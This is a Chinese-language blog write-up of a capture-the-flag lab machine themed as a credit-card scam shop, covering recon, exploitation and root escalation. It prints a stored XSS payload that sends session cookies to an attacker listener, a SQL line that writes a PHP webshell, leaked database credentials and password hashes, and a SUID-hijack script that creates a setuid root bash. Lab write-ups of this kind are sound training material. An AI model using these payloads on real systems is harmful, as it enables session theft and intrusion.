@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/154585050?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 靶机信息
+骗子正在利用人们，各种假购物网站被建立起来，但人们发现他们的订单根本没送到。">
+<meta property="og:title" content="Credit_Card_Scammers">
+<meta property="og:description" content="# 靶机信息
+骗子正在利用人们，各种假购物网站被建立起来，但人们发现他们的订单根本没送到。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dehua-rd.github.io/post/Credit_Card_Scammers.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
+<title>Credit_Card_Scammers</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Credit_Card_Scammers</h1>
+<div class="title-right">
+    <a href="https://dehua-rd.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/dehua-rd/dehua-rd.github.io/issues/38" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>靶机信息</h1>
+<p>骗子正在利用人们，各种假购物网站被建立起来，但人们发现他们的订单根本没送到。我们发现了一个诈骗网站，认为它正在从受害者那里收集信用卡信息。你的目标是通过获取 root 权限来关闭诈骗网站，并识别他们服务器上的三个标记。我们的情报显示，骗子正在积极审查所有订单，以快速利用信用卡信息。</p>
+<h1>信息收集</h1>
+<h2>Nmap扫描</h2>
+<pre class="notranslate"><code class="notranslate">PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d:0a:3a:42:5f:92:47:69:33:59:b3:77:53:3c:be:73 (RSA)
+|   256 ab:3d:26:3b:d9:02:50:a4:49:c0:bf:13:75:dc:a5:73 (ECDSA)
+|_  256 fb:6a:7e:1b:05:f9:d1:ef:be:dd:ff:39:ed:f5:f5:63 (ED25519)
+80/tcp   open     http         Apache httpd 2.4.37 ((centos))
+|_http-server-header: Apache/2.4.37 (centos)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Your PPE Supplier
+445/tcp  filtered microsoft-ds
+9090/tcp closed   zeus-admin
+MAC Address: 00:0C:29:CA:21:8D (VMware)
+Aggressive OS guesses: Linux 5.1 - 5.15 (98%), Linux 3.10 - 4.11 (96%), Linux 3.2 - 4.14 (94%), Linux 3.16 - 4.6 (94%), OpenWrt 19.07 (Linux 4.14) (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 2.6.39 (93%), Linux 3.13 - 4.4 (92%)
+No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan 21 04:51:13 2026 -- 1 IP address (1 host up) scanned in 21.32 seconds
+</code></pre>
+<p>重点就是排查80端口了。</p>
+<h2>web信息枚举</h2>
+<p>主页是电商平台，扫一下目录</p>
+<pre class="notranslate"><code class="notranslate">[20:50:04] 301 -  238B  - /_admin  -&gt;  http://192.168.218.241/_admin/                                                                            
+[20:50:04] 200 -    1KB - /_admin/                                                                                                               
+[20:50:16] 403 -  217B  - /cgi-bin/                                                                                                              
+[20:50:17] 301 -  237B  - /class  -&gt;  http://192.168.218.241/class/                                                                              
+[20:50:17] 404 -   16B  - /composer.phar                                                                                                         
+[20:50:19] 301 -  235B  - /css  -&gt;  http://192.168.218.241/css/                                                                                  
+                                    
+[20:50:48] 200 -    1KB - /gulpfile.js
+[20:51:04] 301 -  235B  - /img  -&gt;  http://192.168.218.241/img/
+[20:51:04] 404 -   16B  - /index.php/login/
+[20:51:07] 200 -    1KB - /LICENSE
+[20:51:17] 200 -    1KB - /package.json
+[20:51:17] 200 -  194KB - /package-lock.json
+[20:51:17] 404 -   16B  - /php-cs-fixer.phar
+[20:51:19] 404 -   16B  - /phpunit.phar
+[20:51:22] 200 -    4KB - /README.md 
+[20:51:25] 301 -  240B  - /settings  -&gt;  http://192.168.218.241/settings/
+[20:51:25] 200 -  890B  - /settings/ 
+[20:51:34] 200 -    1KB - /vendor/
+</code></pre>
+<pre class="notranslate"><code class="notranslate">/css                  (Status: 301) [Size: 235] [--&gt; http://192.168.218.241/css/]
+/img                  (Status: 301) [Size: 235] [--&gt; http://192.168.218.241/img/]
+/class                (Status: 301) [Size: 237] [--&gt; http://192.168.218.241/class/]
+/index.html           (Status: 200) [Size: 5822]
+/_admin               (Status: 301) [Size: 238] [--&gt; http://192.168.218.241/_admin/]
+/settings             (Status: 301) [Size: 240] [--&gt; http://192.168.218.241/settings/]
+/noindex              (Status: 301) [Size: 239] [--&gt; http://192.168.218.241/noindex/]
+/vendor               (Status: 301) [Size: 238] [--&gt; http://192.168.218.241/vendor/]
+/buynow.php           (Status: 200) [Size: 7164]
+/index.html           (Status: 200) [Size: 5822]
+Progress: 224656 / 224660 (100.00%)
+</code></pre>
+<p>信息比较多，挨个看看，发现都没什么用，存在一个订单提交页面 buynow.php 以及 /_admin/dist/ 跳转的登录页面，有很tpl文件，AI分析说可能是SSTI漏洞，加上sql注入都试了一下，都没用，然后卡了很久，没招了，问了一下红笔，加上这个靶机的简介，感觉就是订单提交的xss漏洞，结合页面带有session，应该是利用xss弹回来高权限的cookie登录。试试</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/75b483e8-c029-49cf-9df8-868645963b22"><img width="1691" height="369" alt="Image" src="https://github.com/user-attachments/assets/75b483e8-c029-49cf-9df8-868645963b22" style="max-width: 100%; height: auto; max-height: 369px;"></a></p>
+<p>在订单表格直接全部写上<code class="notranslate">&lt;script&gt;location.href='[http://192.168.218.128:80/?c='+document.cookie](http://192.168.218.128/?c=%27+document.cookie);&lt;/script&gt;</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9acb7e71-b729-4ba5-9e00-005d02fb4e1c"><img width="1910" height="879" alt="Image" src="https://github.com/user-attachments/assets/9acb7e71-b729-4ba5-9e00-005d02fb4e1c" style="max-width: 100%; height: auto; max-height: 879px;"></a></p>
+<p>kali上打开http监听，成功接受到请求，并附带cookie</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5a4a97ae-6e01-4327-b698-b87bcc6b7d5a"><img width="1919" height="375" alt="Image" src="https://github.com/user-attachments/assets/5a4a97ae-6e01-4327-b698-b87bcc6b7d5a" style="max-width: 100%; height: auto; max-height: 375px;"></a></p>
+<p>更改浏览器的cookie，刷新 /_admin/dist/login.php 页面</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e9b92ecd-1146-46c6-b277-596908250776"><img width="1916" height="424" alt="Image" src="https://github.com/user-attachments/assets/e9b92ecd-1146-46c6-b277-596908250776" style="max-width: 100%; height: auto; max-height: 424px;"></a></p>
+<p>成功登录骗子网站后台</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f94ddb4b-faf8-46b0-9c5e-122b00ef6e17"><img width="1919" height="851" alt="Image" src="https://github.com/user-attachments/assets/f94ddb4b-faf8-46b0-9c5e-122b00ef6e17" style="max-width: 100%; height: auto; max-height: 851px;"></a></p>
+<p>看到有一个 sql管理工具，不知道权限如何，尝试写入webshell 命令<code class="notranslate">SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php'</code></p>
+<p>访问一下，成功了。弹shell回来。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/352f9b1c-a5c3-4e7c-834f-ac13836240cd"><img width="1919" height="401" alt="Image" src="https://github.com/user-attachments/assets/352f9b1c-a5c3-4e7c-834f-ac13836240cd" style="max-width: 100%; height: auto; max-height: 401px;"></a></p>
+<h1>横向移动</h1>
+<p>拿到apache身份，考虑到目标的sql情况，加上 /setting/config.php，怀疑会有敏感数据，看一下</p>
+<pre class="notranslate"><code class="notranslate">cat /var/www/html/settings/config.php
+&lt;?php
+
+$databaseUsername = 'orders';
+$databasePassword = 'Ob2UA15ubBtzpZrvdMYT';
+$databaseServer = 'localhost';
+$databaseName = 'orders';
+
+?&gt;
+</code></pre>
+<p>连接一下，成功连上数据库。</p>
+<pre class="notranslate"><code class="notranslate">MariaDB [orders]&gt; show tables;
+show tables;
++------------------+
+| Tables_in_orders |
++------------------+
+| orders           |
+| users            |
++------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [orders]&gt; select * from users;
+select * from users;
++--------+--------------+--------------------------------------------------------------+
+| userID | userName     | password                                                     |
++--------+--------------+--------------------------------------------------------------+
+|      1 | admin        | $2y$12$A4jqwtWB73.TAMIeplx0T.5oG/mnHR1qTDa8cmtTIvW3ZTjdSjdjC |
+|      2 | m0n3y6r4bb3r | $2y$12$EX/FDsztTMwftzPRyY8gFuM7ZjAphQRZs88qpZpmboRogOAOYXowC |
++--------+--------------+--------------------------------------------------------------+
+2 rows in set (0.001 sec)
+
+cat /etc/passwd | grep home
+moneygrabber:x:1000:1000::/home/moneygrabber:/bin/bash
+admin:x:1001:1001::/home/admin:/bin/bash
+</code></pre>
+<p>找到了两个用户，刚好对应系统的两个用户，使用john爆破一下，我没有爆破出来，直接找的 密码是 <strong>delta1</strong></p>
+<h1>提权</h1>
+<p>这里用户目录有一个明显的文件backup.sh，很异常，这个文件肯定有问题，文件内容很简单，就是将mysql目录打包很简单，好像没办法利用，AI直接跟我笃定是定时任务，让我直接劫持了，反正没影响试一试，将这个backup文件删了，主机写一个反弹shell的sh文件。然后等一等，结果根本没有动静。</p>
+<p>那就再看看有没有别的发现，执行<code class="notranslate">find / -perm -4000 2&gt;/dev/null</code><br>
+有个输出比较显眼 <strong>/usr/bin/backup</strong><br>
+这是linux不存在的默认命令，感觉他跟家目录的backup文件有关系<br>
+使用了一下发现卡住了，由于我之前已经把backup改了，但是，我又没有收到shell，利用strings看一下程序。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3238dd67-f3ec-4d80-b054-170b6fe2ffe8"><img width="1919" height="630" alt="Image" src="https://github.com/user-attachments/assets/3238dd67-f3ec-4d80-b054-170b6fe2ffe8" style="max-width: 100%; height: auto; max-height: 630px;"></a></p>
+<p>发现存在 <strong>/home/moneygrabber/backup.sh</strong> 字符串，感觉这个 SUID 程序的作用就是以 Root 身份去执行家目录下的那个脚本！</p>
+<p>尝试写提权脚本</p>
+<pre class="notranslate"><code class="notranslate">#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+</code></pre>
+<p>制作一个带s位的bash</p>
+<p>然后执行 <code class="notranslate">/usr/bin/backup</code>再执行<code class="notranslate">/tmp/rootbash -p</code> 保留s位打开一个shell</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/483c3ff6-6d65-4b6a-b70e-332cc8c46922"><img width="1919" height="593" alt="Image" src="https://github.com/user-attachments/assets/483c3ff6-6d65-4b6a-b70e-332cc8c46922" style="max-width: 100%; height: auto; max-height: 593px;"></a></p>
+<p>OK提权成功。</p>
+<h1>反思</h1>
+<p>靶机稍难，大多了不带交互的靶机，遇到需要交互的靶机后卡了这么久，没想到是xss拿的shell，没有提示我指定完蛋，包括横向提权的找到密码简单，爆破我也没有爆破出来，太慢了，不知道有没有什么好办法，可以快速爆破出来。然后就是最后的提权，劫持文件，我第一反应就是root的文件，我好像删不了，并且发现这个文件之后，也是一直执着于这个文件很久，各种问AI也没办法提权，才开始找其他的遗漏。靶机非常不错，很考验玩家思路。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://dehua-rd.github.io">dehua</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","dehua-rd/dehua-rd.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
